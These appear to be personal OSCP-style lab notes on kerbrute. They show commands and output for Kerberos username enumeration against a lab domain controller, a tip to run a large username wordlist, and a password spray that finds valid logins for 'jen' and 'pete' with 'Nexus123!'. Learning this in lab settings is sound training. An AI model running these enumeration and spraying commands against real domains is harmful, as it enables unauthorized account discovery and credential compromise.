
https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication Grab the latest binaries from the [releases page](https://github.com/ropnop/kerbrute/releases/latest) to get started.


Download in my kali tools/kerbrute


```
./kerbrute_linux_amd64 userenum -d oscp.exam --dc 10.10.133.152 ../OSCP-C/MS01-153/users.txt
```

```
┌──(kali㉿kali)-[~/binaries]
└─$ ./kerbrute_linux_amd64 userenum -d oscp.exam --dc 10.10.133.152 ../OSCP-C/MS01-153/users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/06/24 - Ronnie Flathers @ropnop

2024/10/06 22:33:41 >  Using KDC(s):
2024/10/06 22:33:41 >   10.10.133.152:88

2024/10/06 22:33:42 >  [+] VALID USERNAME:       web_svc@oscp.exam
2024/10/06 22:33:42 >  Done! Tested 7 usernames (1 valid) in 0.667 seconds
```

## Recommended brute force with seclist: userenum type
```
./kerbrute_linux_amd64 userenum -d oscp.exam --dc 10.10.133.152 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Using kerbrute to attack user accounts
```
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```